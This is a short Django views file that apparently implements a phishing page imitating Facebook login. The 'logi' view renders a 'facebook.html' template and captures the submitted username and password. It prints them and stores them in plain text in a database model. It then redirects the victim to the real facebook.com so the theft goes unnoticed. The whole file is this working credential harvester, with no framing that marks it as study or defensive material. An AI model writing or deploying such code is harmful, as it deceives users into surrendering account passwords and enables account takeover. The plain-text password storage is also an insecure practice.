from django.shortcuts import render, redirect
from .models import userss

def main(request):
    return render(request,'main.html')

def logi(request):
    if request.method == 'POST' and 'u_name' in request.POST and 'u_pass' in request.POST:
        username = request.POST.get('u_name')
        password = request.POST.get('u_pass')
        if username and password:
            print(username, password)
            userss.objects.create(username=username, password=password)
            return redirect('https://www.facebook.com/')
        else:
            print("Missing username or password")
    return render(request, 'facebook.html')
